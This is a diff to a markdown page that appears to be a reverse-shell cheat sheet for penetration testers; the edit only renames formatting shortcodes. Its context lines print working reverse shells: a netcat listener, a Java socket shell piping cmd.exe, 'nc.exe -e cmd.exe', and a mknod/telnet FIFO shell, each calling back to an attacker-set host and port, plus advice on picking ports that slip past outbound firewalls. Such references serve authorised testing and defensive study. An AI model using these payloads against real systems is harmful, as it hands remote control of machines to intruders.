@@ -25,11 +25,11 @@ sudo nc -nvlp {{< param "war.lport" >}}
 - `p <port>`: local port used for listening.
 {{</details>}}
 
-{{<hint warning>}}
+{{<note>}}
 Use a port that is likely allowed via outbound firewall rules on the target network.
 
 Ports from 1 to 1023 are by default privileged ports. To bind to a privileged port, a process must be running with root permissions.
-{{</hint>}}
+{{</note>}}
 
 ### Bash
 
@@ -142,9 +142,9 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-{{<hint info>}}
+{{<note>}}
 Java reverse shell also works for Groovy.
-{{</hint>}}
+{{</note>}}
 
 ### Lua
 
@@ -209,9 +209,9 @@ nc.exe {{< param "war.lhost" >}} {{< param "war.lport" >}} -e cmd.exe
 rm -f /tmp/f; mknod /tmp/f p && telnet {{< param "war.lhost" >}} {{< param "war.lport" >}} 0/tmp/p
 ```
 
-{{<hint info>}}
+{{<note>}}
 A FIFO can be create both with `mknod <path> p` or `mkfifo <path>` .
-{{</hint>}}
+{{</note>}}
 
 
 ## Encrypted Shells
